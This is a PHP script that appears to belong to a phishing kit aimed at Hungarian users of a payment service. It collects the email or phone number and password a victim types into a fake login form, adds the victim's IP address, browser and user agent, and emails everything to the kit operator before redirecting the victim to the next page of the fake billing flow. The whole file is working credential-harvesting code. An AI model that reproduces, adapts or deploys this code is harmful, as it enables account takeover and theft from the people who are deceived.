<?php
error_reporting(0);
session_start();
include("./config/madara.php");
include("./config/obito.php");
include("lang/". $_SESSION['_lang_'].".php");
        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $subject  = " log  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
    $headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: madara@madara.hu" . "\r\n";
	$message = "
<body style='background: black;'>			
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font color='white'>_____________________________________________________________________<br>
<font color='white'>IP         =>   <font color='#290DFF'>".$_SESSION['_IP_']."</font><br />
<font color='white'>TIME       =>   <font color='#290DFF'>".$time."</font><br />
<font color='white'>BROWSER    =>   <font color='#290DFF'>".$browser."</font><br />
<font color='white'>AGENT      =>   <font color='#290DFF'>".$user_agent."</font><br />
<font color='white'>EMAIL&PHONE=>   <font color='#FF0000'>".$_POST['el']."</font><br />
<font color='white'>PASSWORD   =>   <font color='#FF0000'>".$_POST['pp']."</font><br /> 
<font color='white'>___________________________________________________________________";
     	@mail($to,$subject,$message,$headers);
      $x=md5(microtime());$xx=sha1(microtime());
echo "<script> window.top.location.href = './teljes.php?cmd=_szamla-adatai&session=".$x.$xx."';   </script>";
?>